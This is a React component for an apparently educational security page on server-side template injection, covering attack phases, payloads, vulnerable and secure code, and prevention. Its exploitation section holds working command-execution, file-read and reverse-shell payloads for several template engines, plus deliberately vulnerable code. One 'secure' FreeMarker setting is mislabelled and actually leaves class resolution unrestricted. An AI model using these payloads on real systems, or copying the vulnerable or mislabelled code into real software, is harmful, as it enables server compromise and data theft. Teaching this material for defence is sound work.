
import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const SSTI: React.FC = () => {
  return (
    <section id="ssti" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Server-Side Template Injection (SSTI)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            Server-Side Template Injection (SSTI) occurs when user input is embedded in a template in an unsafe manner.
            Template engines are designed to generate web pages by combining fixed templates with volatile data. SSTI
            vulnerabilities arise when user input is concatenated directly into templates rather than passed in as data.
            This can lead to remote code execution on the server, complete system compromise, and sensitive data disclosure.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Achieve remote code execution on the server by injecting malicious template syntax that gets processed
              by the template engine, potentially leading to complete server compromise, data theft, or lateral movement.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Common Template Engines and Attack Vectors</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="Jinja2 (Python/Flask)"
              description="Powerful template engine used in Flask applications. Vulnerable when user input is concatenated into templates, allowing access to Python objects and system functions."
              severity="high"
            />
            <SecurityCard
              title="Twig (PHP/Symfony)"
              description="PHP template engine that can expose system functions and file operations when exploited through template injection vulnerabilities."
              severity="high"
            />
            <SecurityCard
              title="FreeMarker (Java/Spring)"
              description="Java template engine commonly used in Spring applications. Can lead to arbitrary code execution through built-in objects and methods."
              severity="high"
            />
            <SecurityCard
              title="Handlebars/Mustache (Node.js)"
              description="JavaScript template engines that can be exploited to access Node.js built-in modules and execute system commands."
              severity="medium"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Web Application Views:</strong> User-facing pages that render dynamic content</li>
              <li><strong>Email Templates:</strong> Dynamic email generation with user-provided content</li>
              <li><strong>PDF Generators:</strong> Applications generating PDFs with template engines</li>
              <li><strong>Error Pages:</strong> Custom error pages that include user input</li>
              <li><strong>Report Generation:</strong> Dynamic reports incorporating user data</li>
              <li><strong>CMS Themes:</strong> Content management systems with user-editable templates</li>
              <li><strong>Notification Systems:</strong> Message templates with user-controlled content</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why SSTI Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technical Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Template engines designed for trusted input processing</li>
                <li>Direct concatenation of user input into template strings</li>
                <li>Powerful object access capabilities in template languages</li>
                <li>Insufficient input validation and sanitization</li>
                <li>Missing template sandboxing or security restrictions</li>
                <li>Access to dangerous functions and system objects</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Treating user input as template code instead of data</li>
                <li>Poor separation between templates and data</li>
                <li>Lack of proper context awareness</li>
                <li>Missing output encoding for template syntax</li>
                <li>Inadequate security policies for template execution</li>
                <li>Using powerful template engines for simple tasks</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Reconnaissance</TabsTrigger>
              <TabsTrigger value="detection">Detection</TabsTrigger>
              <TabsTrigger value="identification">Identification</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Template Engine Reconnaissance</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify Reflection Points:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Find inputs that are reflected in page responses</li>
                      <li>Test form fields, URL parameters, and headers</li>
                      <li>Look for error messages containing user input</li>
                      <li>Check email templates and notifications</li>
                    </ul>
                  </li>
                  <li><strong>Technology Stack Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify web framework and programming language</li>
                      <li>Look for template engine indicators in responses</li>
                      <li>Analyze error messages for framework details</li>
                      <li>Check HTTP headers for technology information</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="detection" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: SSTI Vulnerability Detection</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Detection Payloads:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Mathematical Expressions:</strong> Test template syntax with calculations</li>
                    <li><strong>Template-Specific Syntax:</strong> Try engine-specific delimiters</li>
                    <li><strong>String Operations:</strong> Test string multiplication operations</li>
                    <li><strong>Object Access:</strong> Attempt to access built-in objects</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="identification" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Template Engine Identification</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Engine Fingerprinting:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Jinja2/Twig:</strong> String multiplication returns repeated characters</li>
                    <li><strong>FreeMarker:</strong> Mathematical expressions return calculated results</li>
                    <li><strong>Velocity:</strong> Variable assignment and evaluation syntax</li>
                    <li><strong>Smarty:</strong> Simple mathematical expressions</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: SSTI Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Object Traversal:</strong> Navigate through object hierarchies</li>
                    <li><strong>Method Invocation:</strong> Call dangerous methods and functions</li>
                    <li><strong>File Operations:</strong> Read, write, or execute files</li>
                    <li><strong>Command Execution:</strong> Execute system commands</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Detection Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">SSTI Detection Payloads</h4>
          <CodeExample 
            language="text" 
            isVulnerable={true}
            title="Universal Detection Payloads" 
            code={`# Mathematical expressions (template-agnostic)
{{7*7}}
\${7*7}
#{7*7}
%{7*7}
\${{7*7}}

# If you see "49" in the response, SSTI is likely present

# String multiplication (Jinja2/Twig specific)
{{7*'7'}}  # Should return "7777777" in Jinja2/Twig

# Conditional expressions
{{7==7}}   # Should return True/true
{{7!=7}}   # Should return False/false

# Object access attempts
{{''.__class__}}
{{[].pop}}
{{''|list}}

# Template engine specific
\${7*7}     # FreeMarker
#set(\$x=7*7)\$x  # Velocity
{7*7}      # Smarty
{{7*7}}    # Jinja2/Twig/Django`} 
          />
        </div>

        {/* Exploitation Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">SSTI Exploitation Examples</h4>
          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Jinja2 SSTI Exploitation (Python/Flask)" 
            code={`# Basic payload structure for Jinja2
{{''.__class__.__mro__[2].__subclasses__()}}

# File read payload
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Command execution payload - Method 1
{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Command execution payload - Method 2
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

# Using request object (Flask specific)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Alternative approach using lipsum
{{lipsum.__globals__['os'].popen('ls -la').read()}}

# Using cycler object
{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# Reverse shell payload
{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['subprocess'].Popen(['bash','-c','bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])}}`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Twig SSTI Exploitation (PHP/Symfony)" 
            code={`# Basic Twig payload for command execution
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Alternative Twig payload using system
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# File read operations in Twig
{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}
{{source('/etc/passwd')}}

# Using global variables
{{dump(app)}}  # Dump application object

# Filter-based execution
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("cat /etc/passwd")}}

# Using Twig functions for file operations
{{include('/etc/passwd')}}

# PHP function execution
{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("/etc/passwd")}}`} 
          />
          
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="FreeMarker SSTI Exploitation (Java)" 
            code={`# FreeMarker command execution
<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }

# Alternative FreeMarker payload
\${"freemarker.template.utility.Execute"?new()("whoami")}

# File read in FreeMarker
<#assign file=object?api.class.forName("java.io.File")?constructor?api("/etc/passwd")?new()>
<#assign scanner=object?api.class.forName("java.util.Scanner")?constructor?api(file)?new()>
<#assign content=scanner.nextLine()>
\${content}

# Class loader manipulation
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz.getMethod("getRuntime",null).invoke(null,null)>
<#assign process=runtime.exec("whoami")>

# Using ObjectConstructor
<#assign constructor = object?api.class.forName("java.lang.ProcessBuilder")?constructor>
<#assign process = constructor(["whoami"])?new()>
\${process.start()}`} 
          />
          
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="Velocity SSTI Exploitation (Java)" 
            code={`# Basic Velocity command execution
#set(\$str=\$class.inspect("java.lang.String").type)
#set(\$chr=\$class.inspect("java.lang.Character").type)
#set(\$ex=\$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
\$ex.waitFor()
#set(\$out=\$ex.getInputStream())

# Alternative Velocity payload
#set(\$proc=\$class.inspect("java.lang.ProcessBuilder").type)
#set(\$inArray=["cmd.exe","/c","dir"])
\$proc.new(\$inArray).start()

# File operations in Velocity
#set(\$file=\$class.inspect("java.io.File").type)
#set(\$f=\$file.new("/etc/passwd"))
#set(\$scanner=\$class.inspect("java.util.Scanner").type.new(\$f))
\$scanner.nextLine()

# Using reflection for command execution
#set(\$rt = \$class.forName("java.lang.Runtime"))
#set(\$method = \$rt.getMethod("getRuntime"))
#set(\$runtime = \$method.invoke(null))
#set(\$process = \$runtime.exec("id"))
\$process.waitFor()`} 
          />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Vulnerable Flask/Jinja2 Implementation" 
            code={`from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # VULNERABLE: User input directly concatenated into template
    template = f"Hello {name}!"
    return render_template_string(template)

@app.route('/profile/<username>')
def profile(username):
    # VULNERABLE: Template string contains user input
    template = "Welcome " + username + "! Your profile is ready."
    return render_template_string(template)

@app.route('/error')
def error():
    error_msg = request.args.get('msg', 'Unknown error')
    # VULNERABLE: Error message in template without escaping
    error_template = f"<h1>Error: {error_msg}</h1>"
    return render_template_string(error_template)

# Vulnerable email template function
def send_notification(user_name, message):
    # VULNERABLE: User content in template string
    email_template = f"""
    Dear {user_name},
    
    {message}
    
    Best regards,
    The Team
    """
    return render_template_string(email_template)`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP/Twig Implementation" 
            code={`<?php
require_once 'vendor/autoload.php';

\\$loader = new \\\\Twig\\\\Loader\\\\ArrayLoader([]);
\\$twig = new \\\\Twig\\\\Environment(\\$loader);

// VULNERABLE: User input directly in template string
function generateWelcome(\\$username) {
    global \\$twig;
    \\$template = "Hello " . \\$username . "! Welcome to our site.";
    return \\$twig->createTemplate(\\$template)->render();
}

// VULNERABLE: Email template with user content
function sendEmail(\\$to, \\$subject, \\$userMessage) {
    global \\$twig;
    \\$emailTemplate = "
        <h1>{{\\$subject}}</h1>
        <p>{{\\$userMessage}}</p>
        <p>Thank you!</p>
    ";
    return \\$twig->createTemplate(\\$emailTemplate)->render([
        'subject' => \\$subject,
        'userMessage' => \\$userMessage
    ]);
}

// VULNERABLE: Dynamic template creation
if (isset(\\$_GET['template'])) {
    \\$userTemplate = \\$_GET['template'];
    echo \\$twig->createTemplate(\\$userTemplate)->render();
}
?>`} 
          />
          
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="Vulnerable Spring/FreeMarker Implementation" 
            code={`@Controller
public class VulnerableController {
    
    @Autowired
    private Configuration freemarkerConfig;
    
    @GetMapping("/welcome")
    public String welcome(@RequestParam String name, Model model) {
        // VULNERABLE: User input in template string
        String templateString = "Welcome " + name + "!";
        
        try {
            Template template = new Template("welcome", 
                new StringReader(templateString), freemarkerConfig);
            StringWriter output = new StringWriter();
            template.process(model, output);
            return output.toString();
        } catch (Exception e) {
            return "Error processing template";
        }
    }
    
    @PostMapping("/report")
    public String generateReport(@RequestParam String userContent) {
        // VULNERABLE: User content directly in template
        String reportTemplate = "<h1>Report</h1><p>" + userContent + "</p>";
        
        try {
            Template template = new Template("report", 
                new StringReader(reportTemplate), freemarkerConfig);
            // Template processing with user content
            return processTemplate(template);
        } catch (Exception e) {
            return "Report generation failed";
        }
    }
}`} 
          />
        </div>

        {/* Secure Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Template Implementation</h4>
          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Secure Flask/Jinja2 Implementation" 
            code={`from flask import Flask, request, render_template_string
from markupsafe import escape
import re

app = Flask(__name__)

# Secure template usage
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # SECURE: Pass user input as template variable, not in template string
    template = "Hello {{ username }}!"
    return render_template_string(template, username=escape(name))

@app.route('/profile/<username>')
def profile(username):
    # SECURE: Use predefined template with data
    template = "Welcome {{ user }}! Your profile is ready."
    return render_template_string(template, user=escape(username))

# Input validation function
def validate_template_input(user_input):
    # Check for template injection patterns
    dangerous_patterns = [
        r'{{.*}}',
        r'{%.*%}',
        r'__class__',
        r'__mro__',
        r'__subclasses__',
        r'__globals__'
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            raise ValueError("Invalid input detected")
    
    return user_input

# Secure email template function
def send_notification(user_name, message):
    # SECURE: Use template files and pass data as context
    template_content = '''
    Dear {{ username }},
    
    {{ user_message }}
    
    Best regards,
    The Team
    '''
    
    # Validate and escape inputs
    safe_username = escape(validate_template_input(user_name))
    safe_message = escape(validate_template_input(message))
    
    return render_template_string(template_content, 
                                  username=safe_username, 
                                  user_message=safe_message)`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={false}
            title="Secure PHP/Twig Implementation" 
            code={`<?php
require_once 'vendor/autoload.php';

\\$loader = new \\\\Twig\\\\Loader\\\\FilesystemLoader('templates');
\\$twig = new \\\\Twig\\\\Environment(\\$loader, [
    'autoescape' => 'html',
    'strict_variables' => true,
]);

// SECURE: Use predefined templates with data
function generateWelcome(\\$username) {
    global \\$twig;
    // Use template file instead of dynamic string
    return \\$twig->render('welcome.html.twig', [
        'username' => htmlspecialchars(\\$username, ENT_QUOTES, 'UTF-8')
    ]);
}

// SECURE: Validate input and use template files
function sendEmail(\\$to, \\$subject, \\$userMessage) {
    global \\$twig;
    
    // Input validation
    if (!validateInput(\\$userMessage)) {
        throw new InvalidArgumentException('Invalid message content');
    }
    
    return \\$twig->render('email.html.twig', [
        'subject' => htmlspecialchars(\\$subject, ENT_QUOTES, 'UTF-8'),
        'message' => htmlspecialchars(\\$userMessage, ENT_QUOTES, 'UTF-8')
    ]);
}

// Input validation function
function validateInput(\\$input) {
    // Check for template injection patterns
    \\$dangerousPatterns = [
        '/{{.*}}/',
        '/{%.*%}/',
        '/\\\\b_self\\\\b/',
        '/\\\\benv\\\\b/',
        '/registerUndefinedFilterCallback/',
    ];
    
    foreach (\\$dangerousPatterns as \\$pattern) {
        if (preg_match(\\$pattern, \\$input)) {
            return false;
        }
    }
    
    return true;
}

// SECURE: Never create templates from user input
// Instead, use a whitelist of allowed templates
\\$allowedTemplates = ['welcome', 'profile', 'email'];
\\$templateName = \\$_GET['template'] ?? 'welcome';

if (in_array(\\$templateName, \\$allowedTemplates)) {
    echo \\$twig->render(\\$templateName . '.html.twig', \\$data);
} else {
    echo \\$twig->render('error.html.twig', ['message' => 'Invalid template']);
}
?>`} 
          />
          
          <CodeExample 
            language="java" 
            isVulnerable={false}
            title="Secure Spring/FreeMarker Implementation" 
            code={`@Controller
public class SecureController {
    
    @Autowired
    private FreeMarkerConfigurer freeMarkerConfigurer;
    
    @GetMapping("/welcome")
    public String welcome(@RequestParam String name, Model model) {
        // SECURE: Use predefined template with data
        model.addAttribute("username", sanitizeInput(name));
        return "welcome"; // Returns welcome.ftl template
    }
    
    @PostMapping("/report")
    public String generateReport(@RequestParam String userContent, Model model) {
        // SECURE: Validate input and use template file
        String sanitizedContent = sanitizeInput(userContent);
        validateForTemplateInjection(sanitizedContent);
        
        model.addAttribute("reportContent", sanitizedContent);
        return "report"; // Returns report.ftl template
    }
    
    // Input sanitization
    private String sanitizeInput(String input) {
        if (input == null) return "";
        
        // HTML encode the input
        return HtmlUtils.htmlEscape(input);
    }
    
    // Template injection validation
    private void validateForTemplateInjection(String input) {
        List<String> dangerousPatterns = Arrays.asList(
            "freemarker.template.utility.Execute",
            "?new()",
            "?api",
            "class.forName",
            "getRuntime",
            "ProcessBuilder"
        );
        
        for (String pattern : dangerousPatterns) {
            if (input.toLowerCase().contains(pattern.toLowerCase())) {
                throw new IllegalArgumentException("Invalid input detected");
            }
        }
    }
    
    // FreeMarker configuration for security
    @Bean
    public FreeMarkerConfigurer freeMarkerConfigurer() {
        FreeMarkerConfigurer configurer = new FreeMarkerConfigurer();
        configurer.setTemplateLoaderPath("classpath:/templates");
        
        Properties settings = new Properties();
        // Disable dangerous built-ins
        settings.setProperty("api_builtin_enabled", "false");
        settings.setProperty("new_builtin_class_resolver", "unrestricted");
        
        configurer.setFreemarkerSettings(settings);
        return configurer;
    }
}`} 
          />
        </div>

        {/* Testing Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step SSTI Testing Methodology</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Testing Checklist:</h5>
            <ol className="list-decimal pl-6 space-y-2 text-sm">
              <li><strong>Input Point Discovery:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Identify all user input fields and parameters</li>
                  <li>Test URL parameters, form fields, headers, cookies</li>
                  <li>Check file upload functionality and error pages</li>
                  <li>Test email templates and notification systems</li>
                </ul>
              </li>
              <li><strong>Basic Detection Testing:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Submit mathematical expressions in template syntax</li>
                  <li>Test multiple template engine syntaxes</li>
                  <li>Monitor responses for calculation results</li>
                  <li>Check for template-specific error messages</li>
                </ul>
              </li>
              <li><strong>Template Engine Fingerprinting:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Use engine-specific detection payloads</li>
                  <li>Analyze error messages for framework clues</li>
                  <li>Test string operations unique to each engine</li>
                  <li>Identify template syntax variations</li>
                </ul>
              </li>
              <li><strong>Exploitation Testing:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Test object traversal capabilities</li>
                  <li>Attempt file read operations</li>
                  <li>Try command execution payloads</li>
                  <li>Check for template sandboxing</li>
                </ul>
              </li>
            </ol>
          </div>
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">SSTI Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Tplmap:</strong> Specialized SSTI detection and exploitation</li>
                <li><strong>Burp Suite:</strong> SSTI scanner and exploitation tools</li>
                <li><strong>OWASP ZAP:</strong> Template injection detection</li>
                <li><strong>Nuclei:</strong> SSTI detection templates</li>
                <li><strong>SSTImap:</strong> Automatic SSTI exploitation tool</li>
                <li><strong>Jaeles:</strong> SSTI detection signatures</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Custom Payloads:</strong> Engine-specific injection strings</li>
                <li><strong>Template Syntax References:</strong> Documentation for each engine</li>
                <li><strong>Postman/Insomnia:</strong> Request crafting and testing</li>
                <li><strong>Browser Developer Tools:</strong> Response analysis</li>
                <li><strong>curl/wget:</strong> Command-line testing</li>
                <li><strong>Payload Lists:</strong> SecLists SSTI payloads</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive SSTI Prevention Strategies</h4>
          <Tabs defaultValue="design">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="design">Design Principles</TabsTrigger>
              <TabsTrigger value="implementation">Implementation</TabsTrigger>
              <TabsTrigger value="configuration">Configuration</TabsTrigger>
            </TabsList>
            
            <TabsContent value="design" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Secure Design Principles</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Treat user input as data, never as template code</li>
                    <li>Use predefined template files instead of dynamic template strings</li>
                    <li>Implement strict separation between templates and data</li>
                    <li>Use logic-less template engines when possible (e.g., Mustache)</li>
                    <li>Avoid concatenating user input into template strings</li>
                    <li>Use allowlisting for acceptable template operations</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="implementation" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Secure Implementation Practices</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Always pass user input as template variables, not template content</li>
                    <li>Implement comprehensive input validation and sanitization</li>
                    <li>Use autoescaping features of template engines</li>
                    <li>Apply context-aware output encoding</li>
                    <li>Validate template syntax before processing</li>
                    <li>Use template file whitelisting mechanisms</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="configuration" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Template Engine Security Configuration</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Enable template sandboxing features when available</li>
                    <li>Disable dangerous built-in functions and objects</li>
                    <li>Configure strict variable access policies</li>
                    <li>Implement template execution timeouts</li>
                    <li>Use minimal template engine configurations</li>
                    <li>Regular security audits of template configurations</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Special Cases and Environments */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special Cases and Development Environments</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Framework-Specific Considerations</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Flask/Django:</strong> Use template files with context variables</li>
                <li><strong>Symfony:</strong> Configure Twig with strict escaping</li>
                <li><strong>Spring Boot:</strong> Secure FreeMarker configuration</li>
                <li><strong>Express.js:</strong> Use safe Handlebars/Mustache setup</li>
                <li><strong>Laravel:</strong> Blade template security considerations</li>
                <li><strong>Ruby on Rails:</strong> ERB template safety measures</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Environment-Specific Issues</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Development:</strong> Debug modes may expose more functionality</li>
                <li><strong>Legacy Systems:</strong> Older template engines with fewer security features</li>
                <li><strong>Microservices:</strong> Template injection in service-to-service communication</li>
                <li><strong>Cloud Deployments:</strong> Container escape via template injection</li>
                <li><strong>CMS Platforms:</strong> User-editable themes and templates</li>
                <li><strong>Email Systems:</strong> Template injection in notification services</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default SSTI;
